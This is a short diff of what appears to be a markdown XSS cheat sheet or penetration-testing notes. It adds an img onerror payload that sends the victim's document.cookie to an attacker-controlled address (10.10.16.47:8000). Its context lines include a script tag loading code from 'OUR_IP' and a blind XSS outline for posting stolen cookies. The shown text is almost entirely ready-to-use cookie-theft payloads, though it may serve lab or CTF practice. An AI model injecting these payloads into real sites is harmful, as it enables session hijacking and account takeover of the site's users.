@@ -49,6 +49,10 @@ append()
 <script src="http://OUR_IP/script.js"></script>
 ```
 
+
+```bash
+<img src=1 onerror=\"document.location='http://10.10.16.47:8000/'+document.cookie\">
+```
 ## Blind XSS
 1) Find Vulnerable Parameter
 2) Create script.js to POST cookie
